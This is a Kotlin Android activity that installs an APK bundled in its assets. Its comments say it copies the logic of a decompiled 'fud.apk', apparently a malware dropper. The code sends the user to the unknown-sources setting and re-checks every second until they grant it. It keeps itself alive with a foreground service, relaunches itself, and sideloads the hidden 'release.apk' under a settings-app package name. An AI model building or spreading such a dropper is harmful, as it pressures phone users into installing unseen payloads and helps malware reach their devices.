package com.settingpro.installer

import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageInstaller
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import java.io.File

class InstallerActivity : AppCompatActivity() {
    companion object {
        private const val TAG = "InstallerActivity"
        private const val REQUEST_INSTALL_PERMISSION = 101
    }

    private lateinit var statusText: TextView
    private lateinit var installButton: Button
    private var apkFile: File? = null

    // Handler for permission retry mechanism (from fud.apk g1/a.java)
    private val retryHandler = Handler(Looper.getMainLooper())
    private val permissionRetryRunnable = object : Runnable {
        override fun run() {
            // Match fud.apk's retry logic - when permission is granted, restart activity
            if (!packageManager.canRequestPackageInstalls()) {
                // Retry after 1 second if permission still not granted
                retryHandler.postDelayed(this, 1000L)
            } else {
                // Permission granted - start new activity with CLEAR_TASK flags (like fud.apk)
                val intent = Intent(this@InstallerActivity, InstallerActivity::class.java)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                              Intent.FLAG_ACTIVITY_CLEAR_TASK or
                              Intent.FLAG_ACTIVITY_TASK_ON_HOME
                startActivity(intent)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        copyApkToCache()
        createUI()

        // Match fud.apk's onCreate - check permission and start installation immediately if granted
        if (packageManager.canRequestPackageInstalls()) {
            Log.d(TAG, "Permission granted, starting installation immediately...")
            installApkInternal()
        } else {
            Log.d(TAG, "Permission not granted, requesting...")
            requestInstallPermission()
        }
    }

    override fun onResume() {
        super.onResume()
        // Retry mechanism: keep checking permission every second
        // Match fud.apk jPfXPQJdzLf8nBacZr.java line 63-69
        if (!packageManager.canRequestPackageInstalls()) {
            retryHandler.post(permissionRetryRunnable)
        }
    }

    override fun onPause() {
        super.onPause()
        // Stop retry when activity is not visible
        retryHandler.removeCallbacks(permissionRetryRunnable)
    }

    override fun onDestroy() {
        super.onDestroy()
        // Clean up retry handler
        retryHandler.removeCallbacks(permissionRetryRunnable)
        // Stop monitoring service
        stopMonitoringService()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        // Stop the monitoring service
        stopMonitoringService()

        // Handle permission result (like fud.apk jPfXPQJdzLf8nBacZr.java line 32-42)
        if (requestCode == REQUEST_INSTALL_PERMISSION) {
            if (packageManager.canRequestPackageInstalls()) {
                // Permission granted, proceed with installation
                installApkInternal()
            } else {
                Toast.makeText(this, "Permission not granted to install unknown apps", Toast.LENGTH_LONG).show()
                finish()
            }
        }
    }

    private fun stopMonitoringService() {
        val serviceIntent = Intent(this, PermissionMonitorService::class.java).apply {
            action = PermissionMonitorService.ACTION_STOP_MONITORING
        }
        startService(serviceIntent)
    }

    private fun createUI() {
        val layout = androidx.constraintlayout.widget.ConstraintLayout(this).apply {
            layoutParams = androidx.constraintlayout.widget.ConstraintLayout.LayoutParams(
                androidx.constraintlayout.widget.ConstraintLayout.LayoutParams.MATCH_PARENT,
                androidx.constraintlayout.widget.ConstraintLayout.LayoutParams.MATCH_PARENT
            )
            setPadding(48, 48, 48, 48)
        }

        statusText = TextView(this).apply {
            id = android.R.id.text1
            text = "Preparing installation..."
            textSize = 18f
            setTextAppearance(androidx.appcompat.R.style.TextAppearance_AppCompat_Medium)
        }

        installButton = Button(this).apply {
            id = android.R.id.button1
            text = "Retry"
            setOnClickListener { installApk() }
        }

        layout.addView(statusText)
        layout.addView(installButton)

        androidx.constraintlayout.widget.ConstraintSet().apply {
            clone(layout)
            connect(statusText.id, androidx.constraintlayout.widget.ConstraintSet.TOP, androidx.constraintlayout.widget.ConstraintSet.PARENT_ID, androidx.constraintlayout.widget.ConstraintSet.TOP, 100)
            connect(statusText.id, androidx.constraintlayout.widget.ConstraintSet.START, androidx.constraintlayout.widget.ConstraintSet.PARENT_ID, androidx.constraintlayout.widget.ConstraintSet.START)
            connect(statusText.id, androidx.constraintlayout.widget.ConstraintSet.END, androidx.constraintlayout.widget.ConstraintSet.PARENT_ID, androidx.constraintlayout.widget.ConstraintSet.END)
            connect(installButton.id, androidx.constraintlayout.widget.ConstraintSet.BOTTOM, androidx.constraintlayout.widget.ConstraintSet.PARENT_ID, androidx.constraintlayout.widget.ConstraintSet.BOTTOM, 100)
            connect(installButton.id, androidx.constraintlayout.widget.ConstraintSet.START, androidx.constraintlayout.widget.ConstraintSet.PARENT_ID, androidx.constraintlayout.widget.ConstraintSet.START)
            connect(installButton.id, androidx.constraintlayout.widget.ConstraintSet.END, androidx.constraintlayout.widget.ConstraintSet.PARENT_ID, androidx.constraintlayout.widget.ConstraintSet.END)
            applyTo(layout)
        }

        setContentView(layout)
    }

    private fun copyApkToCache() {
        try {
            apkFile = File(cacheDir, "release.apk")
            if (!apkFile!!.exists()) {
                assets.open("release.apk").use { input ->
                    apkFile!!.outputStream().use { output ->
                        input.copyTo(output)
                    }
                }
            }
        } catch (e: Exception) {
            Toast.makeText(this, "Failed to prepare APK: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun installApk() {
        val file = apkFile
        if (file == null || !file.exists()) {
            Toast.makeText(this, "APK file not found", Toast.LENGTH_LONG).show()
            return
        }

        // Check permission first
        if (!packageManager.canRequestPackageInstalls()) {
            requestInstallPermission()
            return
        }

        // Permission already granted, install immediately
        installApkInternal()
    }

    private fun requestInstallPermission() {
        // Start foreground service to monitor permission changes
        // This keeps the app alive even when settings kills the activity
        val serviceIntent = Intent(this, PermissionMonitorService::class.java).apply {
            action = PermissionMonitorService.ACTION_START_MONITORING
        }
        startForegroundService(serviceIntent)

        // Request install permission (like fud.apk jPfXPQJdzLf8nBacZr.java line 59)
        val intent = Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES").apply {
            data = Uri.parse("package:$packageName")
        }
        startActivityForResult(intent, REQUEST_INSTALL_PERMISSION)
    }

    private fun installApkInternal() {
        val file = apkFile
        if (file == null || !file.exists()) {
            Log.e(TAG, "APK file not found")
            Toast.makeText(this, "APK file not found", Toast.LENGTH_LONG).show()
            return
        }

        try {
            installButton.isEnabled = false
            statusText.text = "Preparing install…"

            val packageInstaller = packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)

            // Get package name from APK
            val packageInfo = packageManager.getPackageArchiveInfo(file.absolutePath, 0)
            val packageName = packageInfo?.packageName

            Log.d(TAG, "Package name from APK: $packageName")

            if (packageName == null) {
                installButton.isEnabled = true
                statusText.text = "Click Install to install the app"
                Toast.makeText(this, "Could not determine package name", Toast.LENGTH_LONG).show()
                return
            }

            val sessionId = packageInstaller.createSession(params)
            Log.d(TAG, "Session created: $sessionId")

            val session = packageInstaller.openSession(sessionId)

            // Write APK bytes into the session
            session.openWrite("base.apk", 0, file.length()).use { output ->
                file.inputStream().use { input ->
                    input.copyTo(output)
                    session.fsync(output)
                }
            }

            // Create broadcast intent with package name extra
            val broadcastIntent = Intent(this, InstallReceiver::class.java).apply {
                putExtra(PackageInstaller.EXTRA_PACKAGE_NAME, packageName)
            }

            val pendingIntentFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            } else {
                PendingIntent.FLAG_UPDATE_CURRENT
            }
            val pendingIntent = PendingIntent.getBroadcast(
                this, sessionId, broadcastIntent, pendingIntentFlags
            )

            Log.d(TAG, "Committing session $sessionId...")
            session.commit(pendingIntent.intentSender)
            session.close()

            statusText.text = "Installing..."

        } catch (e: Exception) {
            Log.e(TAG, "Error installing APK", e)
            installButton.isEnabled = true
            statusText.text = "Click Install to install the app"
            Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }
}
